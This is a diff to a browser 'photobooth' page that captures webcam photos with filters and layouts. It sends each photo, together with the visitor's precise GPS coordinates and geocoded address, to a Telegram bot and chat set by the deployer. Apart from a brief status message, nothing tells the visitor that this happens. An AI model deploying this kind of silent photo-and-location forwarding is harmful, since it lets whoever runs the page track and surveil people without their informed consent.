@@ -746,6 +746,8 @@
                 // TELEGRAM BOT CONFIGURATION - GANTI DENGAN TOKEN DAN CHAT ID ANDA
                 this.TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
                 this.TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+                // OPEN CAGE API KEY - GANTI DENGAN API KEY ANDA UNTUK GEOLOKASI
+                this.OPENCAGE_API_KEY = 'YOUR_OPENCAGE_API_KEY'; // Replace with your actual OpenCage API Key
                 
                 this.video = document.getElementById('video');
                 this.canvas = document.getElementById('canvas');
@@ -758,12 +760,12 @@
                 this.locationInfo = document.getElementById('locationInfo');
                 this.statusMessage = document.getElementById('statusMessage');
                 
-                this.currentFrame = 1;
+                this.currentFrameLayout = 1; // Corresponds to 'data-frame' for layout (1, 2, 4, 6)
                 this.currentEffect = 'none';
                 this.currentDecoration = 'none';
                 this.currentEmoji = 'none';
-                this.capturedPhotos = [];
-                this.framePhotos = [];
+                this.capturedPhotos = []; // Stores URLs of captured photos for the gallery
+                this.photosForFrame = []; // Stores individual photos before combining into a multi-frame
                 this.isCapturing = false;
                 this.userLocation = null;
                 
@@ -784,28 +786,28 @@
                         video: { 
                             width: { ideal: 1920 }, 
                             height: { ideal: 1080 },
-                            facingMode: 'user'
+                            facingMode: 'user' // Use 'environment' for rear camera on mobile
                         }
                     });
                     this.video.srcObject = stream;
                     this.showStatus('📹 Camera ready!', 'info');
                 } catch (error) {
                     console.error('Error accessing camera:', error);
-                    this.showStatus('❌ Cannot access camera. Please allow camera permission.', 'error');
+                    this.showStatus('❌ Cannot access camera. Please allow camera permission and refresh.', 'error');
                 }
             }
 
             async getLocation() {
                 try {
                     if (!navigator.geolocation) {
-                        throw new Error('Geolocation not supported');
+                        throw new Error('Geolocation not supported by your browser.');
                     }
                     
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
                             timeout: 10000,
-                            maximumAge: 300000
+                            maximumAge: 300000 // Cache location for 5 minutes
                         });
                     });
                     
@@ -815,9 +817,9 @@
                         accuracy: position.coords.accuracy
                     };
                     
-                    // Get address from coordinates
+                    // Get address from coordinates using OpenCage Geocoding API
                     try {
-                        const response = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${this.userLocation.latitude}+${this.userLocation.longitude}&key=YOUR_OPENCAGE_API_KEY`);
+                        const response = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${this.userLocation.latitude}+${this.userLocation.longitude}&key=${this.OPENCAGE_API_KEY}`);
                         const data = await response.json();
                         const address = data.results[0]?.formatted || 'Unknown location';
                         
@@ -826,17 +828,19 @@
                             🌍 ${this.userLocation.latitude.toFixed(6)}, ${this.userLocation.longitude.toFixed(6)}
                         `;
                     } catch (error) {
+                        console.error('Error fetching address from OpenCage:', error);
                         document.getElementById('locationText').innerHTML = `
                             📍 Location detected<br>
                             🌍 ${this.userLocation.latitude.toFixed(6)}, ${this.userLocation.longitude.toFixed(6)}
                         `;
+                        this.showStatus('⚠️ Could not get detailed address.', 'info');
                     }
                     
                     this.showStatus('📍 Location detected!', 'info');
                 } catch (error) {
                     console.error('Error getting location:', error);
-                    document.getElementById('locationText').textContent = 'Location access denied or unavailable';
-                    this.showStatus('📍 Location access denied', 'error');
+                    document.getElementById('locationText').textContent = 'Location access denied or unavailable.';
+                    this.showStatus('📍 Location access denied or unavailable.', 'error');
                 }
             }
 
@@ -844,4 +848,382 @@
                 this.captureBtn.addEventListener('click', () => this.startCapture());
                 
                 // Frame layout selector
-                document.querySelectorAll('.frame-selector .
+                document.querySelectorAll('.frame-selector .frame-option').forEach(option => {
+                    option.addEventListener('click', () => {
+                        document.querySelectorAll('.frame-selector .frame-option').forEach(opt => opt.classList.remove('active'));
+                        option.classList.add('active');
+                        this.currentFrameLayout = parseInt(option.dataset.frame);
+                        this.showStatus(`Layout set to ${this.currentFrameLayout} photo(s).`, 'info');
+                    });
+                });
+
+                // Photo effects selector
+                document.querySelectorAll('.effect-selector .effect-option').forEach(option => {
+                    option.addEventListener('click', () => {
+                        document.querySelectorAll('.effect-selector .effect-option').forEach(opt => opt.classList.remove('active'));
+                        option.classList.add('active');
+                        this.currentEffect = option.dataset.effect;
+                        this.applyEffectToVideo(this.currentEffect);
+                        this.showStatus(`Effect set to ${option.textContent.trim()}.`, 'info');
+                    });
+                });
+
+                // Decorative frames selector
+                document.querySelectorAll('.controls-section .frame-selector:last-of-type .frame-option').forEach(option => {
+                    option.addEventListener('click', () => {
+                        document.querySelectorAll('.controls-section .frame-selector:last-of-type .frame-option').forEach(opt => opt.classList.remove('active'));
+                        option.classList.add('active');
+                        this.currentDecoration = option.dataset.decoration;
+                        this.applyDecoration(this.currentDecoration);
+                        this.showStatus(`Decoration set to ${option.textContent.trim()}.`, 'info');
+                    });
+                });
+
+                // Emoji effects selector
+                document.querySelectorAll('.emoji-selector .emoji-option').forEach(option => {
+                    option.addEventListener('click', () => {
+                        document.querySelectorAll('.emoji-selector .emoji-option').forEach(opt => opt.classList.remove('active'));
+                        option.classList.add('active');
+                        this.currentEmoji = option.dataset.emoji;
+                        this.showStatus(`Emoji effect set to ${option.textContent.trim()}.`, 'info');
+                    });
+                });
+            }
+
+            applyEffectToVideo(effect) {
+                switch (effect) {
+                    case 'sepia':
+                        this.video.style.filter = 'sepia(100%)';
+                        break;
+                    case 'grayscale':
+                        this.video.style.filter = 'grayscale(100%)';
+                        break;
+                    case 'blur':
+                        this.video.style.filter = 'blur(5px)';
+                        break;
+                    case 'brightness':
+                        this.video.style.filter = 'brightness(1.5)';
+                        break;
+                    case 'contrast':
+                        this.video.style.filter = 'contrast(200%)';
+                        break;
+                    case 'none':
+                    default:
+                        this.video.style.filter = 'none';
+                        break;
+                }
+            }
+
+            applyDecoration(decoration) {
+                this.frameDecoration.className = 'frame-decoration'; // Reset classes
+                if (decoration !== 'none') {
+                    this.frameDecoration.classList.add(`${decoration}-frame`);
+                }
+            }
+
+            async startCapture() {
+                if (this.isCapturing) return;
+                this.isCapturing = true;
+                this.captureBtn.disabled = true;
+                this.photosForFrame = [];
+                this.emojiEffects.innerHTML = ''; // Clear previous emojis
+
+                this.showStatus('Starting photo capture...', 'info');
+
+                for (let i = 0; i < this.currentFrameLayout; i++) {
+                    await this.runCountdown();
+                    await this.takePhoto();
+                    if (this.currentFrameLayout > 1) {
+                        this.showStatus(`Captured photo ${i + 1} of ${this.currentFrameLayout}`, 'info');
+                        // Small delay before next photo in multi-shot
+                        await new Promise(resolve => setTimeout(resolve, 500)); 
+                    }
+                }
+
+                if (this.currentFrameLayout > 1) {
+                    await this.combinePhotosIntoFrame();
+                    this.showStatus('Multi-frame photo created!', 'success');
+                } else {
+                    this.showStatus('Photo captured successfully!', 'success');
+                }
+                
+                this.isCapturing = false;
+                this.captureBtn.disabled = false;
+            }
+
+            async runCountdown() {
+                this.countdown.style.display = 'block';
+                for (let i = 3; i > 0; i--) {
+                    this.countdown.textContent = i;
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+                this.countdown.textContent = 'SMILE!';
+                await new Promise(resolve => setTimeout(resolve, 500));
+                this.countdown.style.display = 'none';
+            }
+
+            async takePhoto() {
+                // Apply flash effect
+                this.flash.classList.add('flash-animation');
+                await new Promise(resolve => setTimeout(resolve, 500)); // Flash duration
+                this.flash.classList.remove('flash-animation');
+
+                // Apply emoji effects if selected
+                if (this.currentEmoji !== 'none') {
+                    this.spawnEmojis(this.currentEmoji);
+                }
+                
+                this.canvas.width = this.video.videoWidth;
+                this.canvas.height = this.video.videoHeight;
+                const context = this.canvas.getContext('2d');
+
+                // Draw video frame onto canvas
+                context.filter = this.video.style.filter; // Apply current CSS filter
+                context.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
+                context.filter = 'none'; // Reset filter for subsequent draws
+
+                // Apply decoration on canvas
+                const tempCanvas = document.createElement('canvas');
+                tempCanvas.width = this.canvas.width;
+                tempCanvas.height = this.canvas.height;
+                const tempContext = tempCanvas.getContext('2d');
+                tempContext.drawImage(this.canvas, 0, 0); // Draw existing photo
+
+                if (this.currentDecoration !== 'none') {
+                    this.drawDecorationOnCanvas(tempContext, this.currentDecoration, tempCanvas.width, tempCanvas.height);
+                }
+
+                const dataUrl = tempCanvas.toDataURL('image/png');
+                this.photosForFrame.push(dataUrl);
+
+                // For single capture, add to gallery immediately
+                if (this.currentFrameLayout === 1) {
+                    this.addPhotoToGallery(dataUrl);
+                    this.sendPhotoToTelegram(dataUrl); // Send immediately for single photo
+                }
+            }
+
+            drawDecorationOnCanvas(context, decoration, width, height) {
+                switch (decoration) {
+                    case 'film':
+                        // Film frame border
+                        context.fillStyle = '#333';
+                        context.fillRect(0, 0, width, 15); // Top
+                        context.fillRect(0, height - 15, width, 15); // Bottom
+                        context.fillRect(0, 0, 15, height); // Left
+                        context.fillRect(width - 15, 0, 15, height); // Right
+
+                        // Film strip perforations (simplified for canvas)
+                        context.fillStyle = 'rgba(51, 51, 51, 0.5)';
+                        for (let y = 15; y < height - 15; y += 22) { // Adjust spacing as needed
+                            context.fillRect(0, y, width, 2); 
+                        }
+                        break;
+                    case 'vintage':
+                        // Vintage brown border
+                        context.strokeStyle = 'rgba(139, 69, 19, 0.6)';
+                        context.lineWidth = 8;
+                        context.strokeRect(4, 4, width - 8, height - 8);
+
+                        // Radial gradient overlay (complex to replicate precisely on canvas as CSS filter)
+                        // A simple approach is to draw a semi-transparent brown overlay
+                        context.fillStyle = 'rgba(139, 69, 19, 0.1)';
+                        context.fillRect(0, 0, width, height);
+                        break;
+                    case 'polaroid':
+                        // Polaroid white frame
+                        context.fillStyle = 'white';
+                        context.fillRect(0, 0, width, height); // Fill entire canvas white
+                        context.drawImage(this.canvas, 20, 20, width - 40, height - 80); // Draw image inside
+
+                        // Polaroid text
+                        context.font = '500 14px Poppins';
+                        context.fillStyle = '#666';
+                        context.textAlign = 'center';
+                        context.fillText('Beautiful Moment ✨', width / 2, height - 20);
+                        break;
+                }
+            }
+
+            async combinePhotosIntoFrame() {
+                if (this.photosForFrame.length === 0) return;
+
+                const finalCanvas = document.createElement('canvas');
+                let ctx = finalCanvas.getContext('2d');
+
+                // Determine layout dimensions
+                let cols, rows;
+                switch (this.currentFrameLayout) {
+                    case 2: cols = 2; rows = 1; break;
+                    case 4: cols = 2; rows = 2; break;
+                    case 6: cols = 3; rows = 2; break; // or 2x3
+                    default: cols = 1; rows = 1;
+                }
+
+                // Assuming all captured photos have the same aspect ratio for now
+                // Adjust this if your camera stream changes resolution
+                const img = new Image();
+                img.src = this.photosForFrame[0];
+                await new Promise(resolve => img.onload = resolve);
+
+                const photoWidth = img.width;
+                const photoHeight = img.height;
+
+                finalCanvas.width = photoWidth * cols;
+                finalCanvas.height = photoHeight * rows;
+
+                for (let i = 0; i < this.photosForFrame.length; i++) {
+                    const currentImg = new Image();
+                    currentImg.src = this.photosForFrame[i];
+                    await new Promise(resolve => currentImg.onload = resolve);
+
+                    const col = i % cols;
+                    const row = Math.floor(i / cols);
+
+                    ctx.drawImage(currentImg, col * photoWidth, row * photoHeight, photoWidth, photoHeight);
+                }
+
+                // Add overall decoration if applicable
+                if (this.currentDecoration !== 'none') {
+                    this.drawDecorationOnCanvas(ctx, this.currentDecoration, finalCanvas.width, finalCanvas.height);
+                }
+
+                const finalDataUrl = finalCanvas.toDataURL('image/png');
+                this.addPhotoToGallery(finalDataUrl);
+                this.sendPhotoToTelegram(finalDataUrl);
+                this.photosForFrame = []; // Clear for next capture
+            }
+
+            addPhotoToGallery(dataUrl) {
+                const photoItem = document.createElement('div');
+                photoItem.classList.add('photo-item');
+                const img = document.createElement('img');
+                img.src = dataUrl;
+                photoItem.appendChild(img);
+                
+                // Add download functionality on click
+                photoItem.addEventListener('click', () => {
+                    const a = document.createElement('a');
+                    a.href = dataUrl;
+                    a.download = `photobooth_moment_${new Date().toISOString().replace(/[:.]/g, '-')}.png`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    this.showStatus('Photo downloaded!', 'success');
+                });
+
+                this.photoGallery.prepend(photoItem); // Add to the beginning of the gallery
+                this.capturedPhotos.push(dataUrl);
+            }
+
+            async sendPhotoToTelegram(photoDataUrl) {
+                if (!this.TELEGRAM_BOT_TOKEN || !this.TELEGRAM_CHAT_ID || 
+                    this.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
+                    this.TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.warn('Telegram Bot Token or Chat ID not set. Photo will not be sent to Telegram.');
+                    this.showStatus('⚠️ Telegram API keys not configured.', 'info');
+                    return;
+                }
+
+                try {
+                    const blob = await (await fetch(photoDataUrl)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', this.TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'photobooth.png');
+                    
+                    let caption = 'New photo from Photobooth!';
+                    if (this.userLocation) {
+                        caption += `\n📍 Location: ${this.userLocation.latitude.toFixed(4)}, ${this.userLocation.longitude.toFixed(4)}`;
+                        if (document.getElementById('locationText').textContent.includes('📍')) {
+                            caption += `\n${document.getElementById('locationText').textContent.split('\n')[0].replace('📍 ', '')}`;
+                        }
+                    }
+                    caption += `\n🎨 Effect: ${this.currentEffect}, 🖼️ Decoration: ${this.currentDecoration}, 😊 Emoji: ${this.currentEmoji}`;
+                    
+                    formData.append('caption', caption);
+
+                    const response = await fetch(`https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+                    if (result.ok) {
+                        this.showStatus('✅ Photo sent to Telegram!', 'success');
+                    } else {
+                        console.error('Error sending photo to Telegram:', result);
+                        this.showStatus(`❌ Failed to send to Telegram: ${result.description || 'Unknown error'}`, 'error');
+                    }
+                } catch (error) {
+                    console.error('Network error sending photo to Telegram:', error);
+                    this.showStatus('❌ Network error sending to Telegram.', 'error');
+                }
+            }
+
+            spawnEmojis(emojiType) {
+                const emojis = {
+                    happy: ['😊', '😂', '😁', '🥳'],
+                    love: ['❤️', '💕', '💖', '🥰'],
+                    party: ['🎉', '🥳', '🎈', '🎊'],
+                    cool: ['😎', '🤩', '👍', '🤙'],
+                    cute: ['🥰', '😊', '😻', '✨']
+                };
+
+                const selectedEmojis = emojis[emojiType] || [];
+                if (selectedEmojis.length === 0) return;
+
+                // Clear existing emojis
+                this.emojiEffects.innerHTML = ''; 
+
+                for (let i = 0; i < 5 + Math.random() * 5; i++) { // Spawn 5-10 emojis
+                    const emoji = document.createElement('span');
+                    emoji.classList.add('emoji');
+                    emoji.textContent = selectedEmojis[Math.floor(Math.random() * selectedEmojis.length)];
+                    
+                    const startX = Math.random() * 100;
+                    const startY = 100 + Math.random() * 20; // Start slightly below view
+                    
+                    emoji.style.left = `${startX}%`;
+                    emoji.style.top = `${startY}%`;
+                    
+                    // Randomize animation delay and duration for a more natural look
+                    emoji.style.animationDelay = `${Math.random() * 0.5}s`;
+                    emoji.style.animationDuration = `${3 + Math.random() * 2}s`; // 3-5 seconds
+                    
+                    this.emojiEffects.appendChild(emoji);
+
+                    // Remove emoji after its animation finishes
+                    emoji.addEventListener('animationend', () => {
+                        emoji.remove();
+                    });
+                }
+            }
+
+            createFloatingParticles() {
+                const particlesContainer = document.getElementById('particles');
+                for (let i = 0; i < 50; i++) { // Create 50 particles
+                    const particle = document.createElement('div');
+                    particle.classList.add('particle');
+                    particle.style.left = `${Math.random() * 100}vw`;
+                    particle.style.top = `${Math.random() * 100}vh`;
+                    particle.style.animationDelay = `${Math.random() * 8}s`; // Stagger animation start
+                    particle.style.animationDuration = `${5 + Math.random() * 5}s`; // Vary duration
+                    particlesContainer.appendChild(particle);
+                }
+            }
+
+            showStatus(message, type) {
+                this.statusMessage.textContent = message;
+                this.statusMessage.className = `status-message show status-${type}`; // Reset and add new classes
+                setTimeout(() => {
+                    this.statusMessage.classList.remove('show');
+                }, 3000); // Hide after 3 seconds
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            new ModernPhotobooth();
+        });
+    </script>
+</body>
+</html>
